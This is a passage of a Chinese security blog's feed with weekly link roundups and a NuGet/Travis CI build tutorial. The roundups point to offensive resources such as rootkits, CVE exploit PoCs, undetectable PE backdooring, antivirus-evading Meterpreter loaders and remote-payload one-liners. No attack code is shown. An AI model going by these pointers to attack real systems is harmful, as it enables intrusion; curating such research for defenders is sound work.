<li><p>FruityWifi - 一款无线网络安全审计工具<br><a href="https://github.com/xtr4nge/FruityWifi" target="_blank" rel="external">https://github.com/xtr4nge/FruityWifi</a></p>
</li>
<li>Mailsploit - 邮箱客户端的漏洞利用工具套件，集成了 30 款主流邮箱客户端（Apple Mail、Thunderbird、Yahoo! Mail、ProtonMail 等）的漏洞<br><a href="https://www.mailsploit.com/index" target="_blank" rel="external">https://www.mailsploit.com/index</a></li>
<li>CIA Vault7 RDB中的Windows后门利用方法分析<br><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Vault7-RDB中的Windows后门利用方法分析/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/CIA-Vault7-RDB中的Windows后门利用方法分析/</a></li>
<li>渗透技巧——Windows系统的帐户隐藏<br><a href="https://3gstudent.github.io/3gstudent.github.io/渗透技巧-Windows系统的帐户隐藏/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/渗透技巧-Windows系统的帐户隐藏/</a></li>
<li>有效的隐藏红队基础设施的方法<br><a href="https://posts.specterops.io/designing-effective-covert-red-team-attack-infrastructure-767d4289af43" target="_blank" rel="external">https://posts.specterops.io/designing-effective-covert-red-team-attack-infrastructure-767d4289af43</a></li>
<li>very_overflow的wp<br><a href="http://blog.csdn.net/niexinming/article/details/78724256" target="_blank" rel="external">http://blog.csdn.net/niexinming/article/details/78724256</a></li>
<li>剖析虚拟内存：堆栈，寄存器和汇编代码<br><a href="https://blog.holbertonschool.com/hack-virtual-memory-stack-registers-assembly-code/" target="_blank" rel="external">https://blog.holbertonschool.com/hack-virtual-memory-stack-registers-assembly-code/</a></li>
<li>rematch - 一款二进制 diff 工具<br><a href="https://github.com/nirizr/rematch" target="_blank" rel="external">https://github.com/nirizr/rematch</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;编写简单 Linux 内核模块的实例&lt;br&gt;&lt;a href=&quot;https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234&quot; target=&quot;_blank&quot; rel=&quot;ex
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>NuGet和travis实践</title>
    <link href="http://kevien.github.io/2017/11/29/NuGet%E5%92%8Ctravis%E5%AE%9E%E8%B7%B5/"/>
    <id>http://kevien.github.io/2017/11/29/NuGet和travis实践/</id>
    <published>2017-11-29T10:56:16.000Z</published>
    <updated>2017-12-02T09:21:36.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="S-CR"><a href="#S-CR" class="headerlink" title="S;CR"></a>S;CR</h4><p>工作中接触到了yara，yara项目在windows上编译是通过vs2015编译的，其中用到了openssl和jansson的第三方库，其中作者<a href="https://github.com/plusvic" target="_blank" rel="external">Victor M. Alvarez</a>用的是nuget进行三方库管理的，感觉这个解决方案还不错，可能比自己去下载源码编译lib稍微方便一点儿，所以记录一下。</p>
<h4 id="vs-Solution实际测试"><a href="#vs-Solution实际测试" class="headerlink" title="vs Solution实际测试"></a>vs Solution实际测试</h4><ul>
<li>下面就以openssl库为例进行一下测试。</li>
<li><p>首先需要在项目的根目录下创建一个NuGet.Config 的文件,这个应该是方便vs的NuGet进行索引</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</div><div class="line">&lt;configuration&gt;</div><div class="line">  &lt;packageSources&gt;</div><div class="line">    &lt;add key=&quot;YARA.OpenSSL&quot;</div><div class="line">         value=&quot;https://ci.appveyor.com/nuget/openssl-oaib8n7lvvtp&quot; /&gt;</div><div class="line">    &lt;add key=&quot;YARA.Jansson&quot;</div><div class="line">         value=&quot;https://ci.appveyor.com/nuget/jansson-41we82mn284d&quot; /&gt;</div><div class="line">  &lt;/packageSources&gt;</div><div class="line">&lt;/configuration&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>vs的默认项目会带一个界面，可以直观的去下载，如下图。<br><img src="/2017/11/29/NuGet和travis实践/projectwithui.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/ui.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/out.png" alt=""><br>然后在项目中添加一下头文件的路径以及静态链接库的路径就可以使用了。<br><img src="/2017/11/29/NuGet和travis实践/1.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/2.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/3.png" alt=""></p>
</li>
<li>vs的cmake项目<br><del>vs的cmake项目稍微有些不同，就是他没有图形界面，这个时候可以使用Package Manager Console来进行查找和下载第三方库。</del><br><a href="https://docs.microsoft.com/en-us/nuget/tools/package-manager-console" target="_blank" rel="external">官方说明</a><br>使用Find-Package openssl 进行搜索，可以发现有很多<br><img src="/2017/11/29/NuGet和travis实践/4.png" alt=""><br>使用Install-Package YARA.OPENSSL.X64 命令进行下载<br><img src="/2017/11/29/NuGet和travis实践/5.png" alt=""><br><del>效果是一样的，都会在项目的主目录的下面创建一个packages的目录并就对应的库下载到其中。这个时候就可以通过CmakeLists.txt进行头文件以及静态链接库的包含就可以使用了</del><br>更新：<br>cmake的项目在install-package的时候会找不到default solution的问题，所以只能通过将之前下载的packages的内容复制到cmake的项目下了。<br>CMakeLists.txt的内容如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">cmake_minimum_required(VERSION 3.8)</div><div class="line">include_directories(&quot;$&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/include&quot;)</div><div class="line"></div><div class="line">set(libcrypto $&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/lib/libcrypto.lib)</div><div class="line">set(libssl $&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/lib/libssl.lib)</div><div class="line">add_executable(Demo test.cpp)</div><div class="line"></div><div class="line">target_link_libraries(Demo $&#123;libcrypto&#125; $&#123;libssl&#125;)</div></pre></td></tr></table></figure>
</li>
</ul>
<p>测试通过。<br>代码已上传至Github<br><a href="https://github.com/kevien/democode" target="_blank" rel="external">https://github.com/kevien/democode</a></p>
<h4 id="打包自己的package"><a href="#打包自己的package" class="headerlink" title="打包自己的package"></a>打包自己的package</h4><ul>
<li>yara项目中openssl库是作者自己打包到appveyor上的，那是如何上传自己打的包呢</li>
<li>nuget包的制作可以通过 NuGetPackageExplorer <a href="https://github.com/NuGetPackageExplorer/NuGetPackageExplorer" target="_blank" rel="external">link</a><br>这个工具还是挺方便的。<br><img src="/2017/11/29/NuGet和travis实践/6.png" alt=""></li>
<li>而且这个工具还可以进行上传，如下图所示<br><img src="/2017/11/29/NuGet和travis实践/7.png" alt=""></li>
<li>当然也可以直接使用nuget工具进行上传<br><img src="/2017/11/29/NuGet和travis实践/8.png" alt=""></li>
<li>这样我们就完成了自定义包的上传。<br><img src="/2017/11/29/NuGet和travis实践/9.png" alt=""><br>(现在的方式还是需要进行验证的，也就是需要输入appveyor的用户名和密码，public的方式暂时还没找到方法)<h4 id="利用travis进行持续化集成"><a href="#利用travis进行持续化集成" class="headerlink" title="利用travis进行持续化集成"></a>利用travis进行持续化集成</h4></li>
<li>首先在github创建一个token，并赋予适当的权限。可参考如下链接<br><a href="https://blog.wyrihaximus.net/2015/09/github-auth-token-on-travis/" target="_blank" rel="external">https://blog.wyrihaximus.net/2015/09/github-auth-token-on-travis/</a><br><a href="https://docs.travis-ci.com/user/github-oauth-scopes/" target="_blank" rel="external">https://docs.travis-ci.com/user/github-oauth-scopes/</a></li>
<li>然后在github的项目当中添加.travish.yml 文件，可参考<br><a href="https://docs.travis-ci.com/user/deployment/releases/" target="_blank" rel="external">https://docs.travis-ci.com/user/deployment/releases/</a></li>
<li>测试项目<br><a href="https://github.com/kevien/travisTest/" target="_blank" rel="external">https://github.com/kevien/travisTest/</a><br><img src="/2017/11/29/NuGet和travis实践/10.png" alt=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">部署的时候有几个坑(MDZZ)，一个是file 的位置，这个会在travis的job log的展开中看到(看log、看log、看log)。</div><div class="line">第二个就是要在deploy项下加上键值 skip_cleanup: true</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>用NuGet进行第三方库的操作还是比较方便的,还有就是开源项目的持续集成使用travis工具是个不错的选择。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;S-CR&quot;&gt;&lt;a href=&quot;#S-CR&quot; class=&quot;headerlink&quot; title=&quot;S;CR&quot;&gt;&lt;/a&gt;S;CR&lt;/h4&gt;&lt;p&gt;工作中接触到了yara，yara项目在windows上编译是通过vs2015编译的，其中用到了openssl和jansson
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20171127安全动态(以后每个星期更了)</title>
    <link href="http://kevien.github.io/2017/11/27/20171127%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/11/27/20171127安全动态/</id>
    <published>2017-11-27T05:50:43.000Z</published>
    <updated>2017-12-02T09:21:20.398Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>RECon 2017 会议的演讲视频公开了<br><a href="https://recon.cx/2017/montreal/recordings/" target="_blank" rel="external">https://recon.cx/2017/montreal/recordings/</a></li>
<li>Linux x64 系统中的 Egg Hunting（搜寻长的 Shellcode 并执行）技巧<br><a href="https://pentesterslife.blog/2017/11/24/x64-egg-hunting-in-linux-systems/" target="_blank" rel="external">https://pentesterslife.blog/2017/11/24/x64-egg-hunting-in-linux-systems/</a></li>
<li>自动化动态恶意软件分析中的逃逸与反逃逸技术调查（Paper）<br><a href="https://github.com/bulaza/Publications/blob/master/ROOTS2017/A%20Survey%20On%20Automated%20Dynamic%20Malware%20Analysis%20Evasion%20and%20Counter-Evasion.pdf" target="_blank" rel="external">https://github.com/bulaza/Publications/blob/master/ROOTS2017/A%20Survey%20On%20Automated%20Dynamic%20Malware%20Analysis%20Evasion%20and%20Counter-Evasion.pdf</a></li>
<li>TLS-Redirection - TLS 重定向攻击介绍文档<br><a href="https://github.com/GrrrDog/TLS-Redirection" target="_blank" rel="external">https://github.com/GrrrDog/TLS-Redirection</a></li>
<li>Apache Guacamole - 一款开源的远程桌面网关，支持通过浏览器访问你远程的服务器,thanks html5<br><a href="https://guacamole.apache.org/" target="_blank" rel="external">https://guacamole.apache.org/</a></li>
<li>CryKeX - Linux内存加密密钥提取工具<br><a href="https://github.com/cryptolok/CryKeX" target="_blank" rel="external">https://github.com/cryptolok/CryKeX</a></li>
<li>RamFuzz - 基于深度神经网络、自动化生成单元测试用例的 C++ 代码 Fuzzing<br><a href="https://github.com/dekimir/RamFuzz/blob/master/sci/ramfuzz.md" target="_blank" rel="external">https://github.com/dekimir/RamFuzz/blob/master/sci/ramfuzz.md</a></li>
<li>linux-explorer - 用于 Linux 现场取证的工具箱<br><a href="https://github.com/intezer/linux-explorer" target="_blank" rel="external">https://github.com/intezer/linux-explorer</a></li>
<li>OpenATS续篇：搭建自己的卫星地球站<br><a href="http://www.freebuf.com/articles/wireless/153793.html" target="_blank" rel="external">http://www.freebuf.com/articles/wireless/153793.html</a></li>
<li>玄武的每日安全动态 上放了好多ipv6的研究文章<br><a href="https://weibo.com/ttarticle/p/show?id=2309404179032190099080" target="_blank" rel="external">https://weibo.com/ttarticle/p/show?id=2309404179032190099080</a></li>
<li>TensorFlow自动识别验证码<br><a href="https://mp.weixin.qq.com/s/J9vjaoClzBbR4oigusNdpw" target="_blank" rel="external">https://mp.weixin.qq.com/s/J9vjaoClzBbR4oigusNdpw</a></li>
<li>Gets You Root，Objective-See 研究员对昨天爆出的 macOS ROOT 空密码提权 Bug 的分析<br><a href="https://objective-see.com/blog/blog_0x24.html" target="_blank" rel="external">https://objective-see.com/blog/blog_0x24.html</a></li>
<li>Hacking 智能家居设备，来自 H2HC 2017<br><a href="https://goo.gl/VeV9Nf" target="_blank" rel="external">https://goo.gl/VeV9Nf</a></li>
<li>stacks-cli - 用于一键分析网站所用技术栈的命令行工具<br><a href="https://github.com/WeiChiaChang/stacks-cli" target="_blank" rel="external">https://github.com/WeiChiaChang/stacks-cli</a></li>
<li>malsub - 用于在线恶意软件分析和威胁情报服务的 Python RESTful API 框架<br><a href="https://github.com/diogo-fernan/malsub?utm_content=buffer51301&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer" target="_blank" rel="external">https://github.com/diogo-fernan/malsub?utm_content=buffer51301&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer</a></li>
<li>oni-probe - 网络干扰检测工具<br><a href="https://github.com/TheTorProject/ooni-probe" target="_blank" rel="external">https://github.com/TheTorProject/ooni-probe</a></li>
<li>SpookFlare - Meterpreter 加载器生成工具，可绕过客户端与网络端防御<br><a href="https://github.com/hlldz/SpookFlare" target="_blank" rel="external">https://github.com/hlldz/SpookFlare</a></li>
<li>通过 KPROCESS 结构的 InstrumentationCallback 域实现 Hook<br><a href="https://secrary.com/Random/InstrumentationCallback" target="_blank" rel="external">https://secrary.com/Random/InstrumentationCallback</a></li>
<li>浅谈一下mshta在CVE-2017-11882里的命令构造<br><a href="http://www.freebuf.com/articles/web/155304.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/155304.html</a></li>
<li>Windows 10新子系统*新挑战（看雪2017安全开发者峰会演讲回顾0x9）<br><a href="https://mp.weixin.qq.com/s/CLw5LVg_Gq1qLW8TSKcYYw" target="_blank" rel="external">https://mp.weixin.qq.com/s/CLw5LVg_Gq1qLW8TSKcYYw</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;RECon 2017 会议的演讲视频公开了&lt;br&gt;&lt;a href=&quot;https://recon.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20171121安全动态</title>
    <link href="http://kevien.github.io/2017/11/21/20171121%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/11/21/20171121安全动态/</id>
    <published>2017-11-21T05:03:04.000Z</published>
    <updated>2017-12-15T11:40:28.851Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>如何在 Windows PE 文件中植入一个无法检测到的后门<br><a href="https://haiderm.com/fully-undetectable-backdooring-pe-files/" target="_blank" rel="external">https://haiderm.com/fully-undetectable-backdooring-pe-files/</a></li>
<li>Linux 内核 net/ipv4/inet_connection_sock.c inet_csk_clone_lock Double Free 漏洞（CVE-2017-8890）PoC<br><a href="https://github.com/hardenedlinux/offensive_poc/tree/master/CVE-2017-8890" target="_blank" rel="external">https://github.com/hardenedlinux/offensive_poc/tree/master/CVE-2017-8890</a></li>
<li>使用递归攻击未初始化变量<br><a href="https://signal11.io/index.php/2017/11/19/attacking-uninitialized-variables-with-recursion/" target="_blank" rel="external">https://signal11.io/index.php/2017/11/19/attacking-uninitialized-variables-with-recursion/</a></li>
<li>使用 SCF 文件窃取用户 Hash<br><a href="https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/" target="_blank" rel="external">https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/</a></li>
<li>Meterpreter 渗透框架的 getsystem 命令是如何夺取 SYSTEM 权限的<br><https: blog.xpnsec.com="" becoming-system=""></https:></li>
<li>CVE-2017-11882<br><a href="https://github.com/embedi/CVE-2017-11882" target="_blank" rel="external">https://github.com/embedi/CVE-2017-11882</a></li>
<li>burp-molly-scanner - 将 BurpSuite 变成 Headless 的 Web 应用漏洞扫描器<br><a href="https://github.com/yandex/burp-molly-scanner/" target="_blank" rel="external">https://github.com/yandex/burp-molly-scanner/</a></li>
<li>使用 XSS 窃取 CSRF Token<br><a href="https://digi.ninja/blog/xss_steal_csrf_token.php" target="_blank" rel="external">https://digi.ninja/blog/xss_steal_csrf_token.php</a></li>
<li>微软提供了一个 Windows 10 开发环境虚拟机，里面预装了 SDK、Visual Studio、Bash on Ubuntu on Windows 等等<br><a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines" target="_blank" rel="external">https://developer.microsoft.com/en-us/windows/downloads/virtual-machines</a></li>
<li>利用 WMI 进行 C＆C 通信<br><a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/" target="_blank" rel="external">https://pentestlab.blog/2017/11/20/command-and-control-wmi/</a></li>
<li><p>Windows 下载远程 Payload 并执行任意代码的教程<br><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/" target="_blank" rel="external">https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">之前好像看过中文的</div></pre></td></tr></table></figure>
</li>
<li><p>在 Windows 环境中追查凭证导出的痕迹，来自 2017 ZeroNights<br><a href="https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment" target="_blank" rel="external">https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment</a></p>
</li>
<li>Finding RCE in HP’s Printer Fleet<br><a href="https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/" target="_blank" rel="external">https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/</a></li>
<li>颠覆windows的信任体系——实现任意代码签名劫持<br><a href="https://mp.weixin.qq.com/s/LCo7elFjGzZIVTA4DDuD8Q" target="_blank" rel="external">https://mp.weixin.qq.com/s/LCo7elFjGzZIVTA4DDuD8Q</a></li>
<li>bincat - 一款二进制代码静态分析器<br><a href="https://securityonline.info/bincat-binary-code-static/" target="_blank" rel="external">https://securityonline.info/bincat-binary-code-static/</a></li>
<li>docker-cuckoo - 将 Cuckoo Sandbox 封装进 Docker<br><a href="https://github.com/blacktop/docker-cuckoo" target="_blank" rel="external">https://github.com/blacktop/docker-cuckoo</a></li>
<li>Ring3 / Ring0 Rootkit Hook Detection 1/2<br><a href="http://www.pentestingexperts.com/ring3-ring0-rootkit-hook-detection-1-2/" target="_blank" rel="external">http://www.pentestingexperts.com/ring3-ring0-rootkit-hook-detection-1-2/</a></li>
<li>The Art of Fuzzing – slides and demos<br><a href="https://sec-consult.com/en/blog/2017/11/the-art-of-fuzzing-slides-and-demos/index.html" target="_blank" rel="external">https://sec-consult.com/en/blog/2017/11/the-art-of-fuzzing-slides-and-demos/index.html</a></li>
<li>测试主流 Web 服务器（IIS、Apache、Nginx）在处理文件上传时的文件类型黑白名单问题<br><a href="https://mike-n1.github.io/ExtensionsOverview" target="_blank" rel="external">https://mike-n1.github.io/ExtensionsOverview</a></li>
<li>From Markdown to RCE in Atom<br><a href="https://statuscode.ch/2017/11/from-markdown-to-rce-in-atom/" target="_blank" rel="external">https://statuscode.ch/2017/11/from-markdown-to-rce-in-atom/</a></li>
<li>SSF - 在 TLS 隧道下提供 TCP/UDP 端口转发、SOCKS5 代理以及远程 Shell 的工具<br><a href="https://github.com/securesocketfunneling/ssf" target="_blank" rel="external">https://github.com/securesocketfunneling/ssf</a></li>
<li>Sysmon v6.20 发布，新增了一个改变服务和驱动名称的功能，可以避免恶意软件通过名字判断 Sysmon 的存在<br><https: docs.microsoft.com="" en-us="" sysinternals="" downloads="" sysmon=""></https:></li>
<li>CRLF 头注入与任意 URL 跳转漏洞利用技巧<br>&lt; <a href="https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies&gt;" target="_blank" rel="external">https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies&gt;</a></li>
<li>Windows 交互式会话数字取证研究<br><a href="https://countuponsecurity.com/2017/11/22/digital-forensics-artifacts-of-interactive-sessions/" target="_blank" rel="external">https://countuponsecurity.com/2017/11/22/digital-forensics-artifacts-of-interactive-sessions/</a></li>
<li>使用 DNS 打破 AWS 云环境中的隔离网络<br><a href="https://dejandayoff.com/using-dns-to-break-out-of-isolated-networks-in-a-aws-cloud-environment/" target="_blank" rel="external">https://dejandayoff.com/using-dns-to-break-out-of-isolated-networks-in-a-aws-cloud-environment/</a></li>
<li>网络犯罪分子如何滥用聊天平台 API 作为C&amp;C 通信的基础设施<br><a href="https://documents.trendmicro.com/assets/wp/wp-how-cybercriminals-can-abuse-chat-platform-apis-as-cnc-infrastructures.pdf" target="_blank" rel="external">https://documents.trendmicro.com/assets/wp/wp-how-cybercriminals-can-abuse-chat-platform-apis-as-cnc-infrastructures.pdf</a></li>
<li>Mitre 组织创建了一个称作 ATT&amp;CK 的项目，之前有过推送，这个项目整理了攻击和入侵者常用的一些技术和策略。看到这个项目之后，来自 Veramine 团队的研究员也创建了一个项目，用于总结和讨论如何检测和防御 ATT&amp;CK 项目中涉及的攻击技术<br><a href="https://github.com/veramine/Detections/wiki" target="_blank" rel="external">https://github.com/veramine/Detections/wiki</a></li>
<li>Ursnif 变种利用 TLS Callback 技术实现进程注入<br><a href="https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html" target="_blank" rel="external">https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">有源码</div></pre></td></tr></table></figure></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;如何在 Windows PE 文件中植入一个无法检测到的后门&lt;br&gt;&lt;a href=&quot;https
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20171115安全动态</title>
    <link href="http://kevien.github.io/2017/11/15/20171115%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/11/15/20171115安全动态/</id>
    <published>2017-11-15T03:01:09.000Z</published>
    <updated>2017-11-20T12:21:16.406Z</updated>
    
    <content type="html"><![CDATA[<h4 id="安全动态"><a href="#安全动态" class="headerlink" title="安全动态"></a>安全动态</h4><ul>
<li>rootkit - 针对 Ubuntu 16.04 和 10.04 的 rootkit<br><a href="https://github.com/nurupo/rootkit" target="_blank" rel="external">https://github.com/nurupo/rootkit</a></li>
<li>从 PE 文件结构角度出发，如何手动植入后门<br><a href="http://www.abatchy.com/2017/05/introduction-to-manual-backdooring_24.html" target="_blank" rel="external">http://www.abatchy.com/2017/05/introduction-to-manual-backdooring_24.html</a></li>
<li>osquery 是 Facebook 开源的一款基于 SQL 的操作系统检测和监控框架。前两天推送过一篇《各个团队都是如何使用 osquery 的》。今天 Palantir 团队这篇 Blog 介绍如何部署和配置 osquery 框架<br><a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#104;&#116;&#116;&#x70;&#x73;&#58;&#x2f;&#47;&#109;&#101;&#100;&#105;&#x75;&#x6d;&#46;&#x63;&#111;&#109;&#47;&#64;&#112;&#97;&#108;&#97;&#110;&#116;&#x69;&#114;&#47;&#x6f;&#115;&#x71;&#x75;&#x65;&#114;&#121;&#x2d;&#x61;&#x63;&#114;&#111;&#115;&#x73;&#x2d;&#x74;&#x68;&#101;&#x2d;&#101;&#x6e;&#116;&#101;&#114;&#x70;&#114;&#105;&#x73;&#x65;&#45;&#x33;&#99;&#51;&#99;&#57;&#x64;&#x31;&#51;&#x65;&#99;&#53;&#x35;">&#104;&#116;&#116;&#x70;&#x73;&#58;&#x2f;&#47;&#109;&#101;&#100;&#105;&#x75;&#x6d;&#46;&#x63;&#111;&#109;&#47;&#64;&#112;&#97;&#108;&#97;&#110;&#116;&#x69;&#114;&#47;&#x6f;&#115;&#x71;&#x75;&#x65;&#114;&#121;&#x2d;&#x61;&#x63;&#114;&#111;&#115;&#x73;&#x2d;&#x74;&#x68;&#101;&#x2d;&#101;&#x6e;&#116;&#101;&#114;&#x70;&#114;&#105;&#x73;&#x65;&#45;&#x33;&#99;&#51;&#99;&#57;&#x64;&#x31;&#51;&#x65;&#99;&#53;&#x35;</a></li>
<li>使用 Windows Defender ATP 检查反射型 DLL 加载<br><a href="https://blogs.technet.microsoft.com/mmpc/2017/11/13/detecting-reflective-dll-loading-with-windows-defender-atp/?ocid=cx-twitter-mmpc" target="_blank" rel="external">https://blogs.technet.microsoft.com/mmpc/2017/11/13/detecting-reflective-dll-loading-with-windows-defender-atp/?ocid=cx-twitter-mmpc</a></li>
<li>Windows 系统中的安全软件的 Bypass 策略。从特征检测、行为检测、信誉评估检测三个方向讨论对应的 Bypass 方法<br><a href="https://artofpwn.com/spookflare.html" target="_blank" rel="external">https://artofpwn.com/spookflare.html</a></li>
<li>PowerKrabsEtw - 用于实时 ETW(事件日志) Trace 的 PowerShell 模块，基于微软的 krabsetw 库实现<br><a href="https://github.com/zacbrown/PowerKrabsEtw" target="_blank" rel="external">https://github.com/zacbrown/PowerKrabsEtw</a></li>
<li>如何制作一个低成本的间谍植入器件<br><a href="https://ha.cking.ch/s8_data_line_locator/" target="_blank" rel="external">https://ha.cking.ch/s8_data_line_locator/</a></li>
<li>CVE-2017-5123 漏洞利用全攻略<br><a href="https://paper.seebug.org/451/" target="_blank" rel="external">https://paper.seebug.org/451/</a></li>
<li>iny-URL-Fuzzer - 台湾研究员 Orange Tsai 开源的一款 URL Fuzzer，之前他在 BlackHat 会议分享了一个相关的议题<br><https: github.com="" orangetw="" tiny-url-fuzzer=""></https:></li>
<li>wget HTTP 整型溢出漏洞（CVE-2017-13089）<br><a href="https://xorl.wordpress.com/2017/11/11/cve-2017-13089-wget-http-integer-overflow/" target="_blank" rel="external">https://xorl.wordpress.com/2017/11/11/cve-2017-13089-wget-http-integer-overflow/</a></li>
<li>利用合法工具来隐藏恶意代码<br><a href="https://securelist.com/using-legitimate-tools-to-hide-malicious-code/83074/" target="_blank" rel="external">https://securelist.com/using-legitimate-tools-to-hide-malicious-code/83074/</a></li>
<li>SpookFlare - Meterpreter 加载器生成工具，可绕过客户端和网络端的防御<br><a href="https://github.com/hlldz/SpookFlare" target="_blank" rel="external">https://github.com/hlldz/SpookFlare</a></li>
<li>CouchDB漏洞(CVE–2017–12635, CVE–2017–12636)分析<br><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4716.html</a></li>
<li><p>wget 缓冲区溢出漏洞分析（CVE-2017-13089）<br><a href="https://paper.seebug.org/453/" target="_blank" rel="external">https://paper.seebug.org/453/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这个可以详细的研究一下</div></pre></td></tr></table></figure>
</li>
<li><p>隐写术，恶意软件的避风港<br><a href="https://securityintelligence.com/steganography-a-safe-haven-for-malware/" target="_blank" rel="external">https://securityintelligence.com/steganography-a-safe-haven-for-malware/</a></p>
</li>
<li>MalwareBenchmark又爆0-day涉及yaml语言：CVE-2017-16615<br><a href="https://mp.weixin.qq.com/s/ecEB-SCowg8dINrpwt7X9w" target="_blank" rel="external">https://mp.weixin.qq.com/s/ecEB-SCowg8dINrpwt7X9w</a></li>
<li>RPCForge - Windows RPC Python fuzzer<br><a href="https://github.com/sogeti-esec-lab/RPCForge" target="_blank" rel="external">https://github.com/sogeti-esec-lab/RPCForge</a></li>
<li>应用白名单绕过：mshta.exe<br><a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-mshta-exe/" target="_blank" rel="external">https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-mshta-exe/</a></li>
<li>应用白名单绕过：regsvr32.exe<br><a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-regsvr32-exe/" target="_blank" rel="external">https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-regsvr32-exe/</a></li>
<li>idaplugins-list - 一份 IDA Plugin列表<br><a href="https://github.com/onethawt/idaplugins-list/blob/master/README.md" target="_blank" rel="external">https://github.com/onethawt/idaplugins-list/blob/master/README.md</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">谁来整理个burpsuite的插件列表</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>发现刷github的首页要比刷twitter更有意思</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;安全动态&quot;&gt;&lt;a href=&quot;#安全动态&quot; class=&quot;headerlink&quot; title=&quot;安全动态&quot;&gt;&lt;/a&gt;安全动态&lt;/h4&gt;&lt;ul&gt;
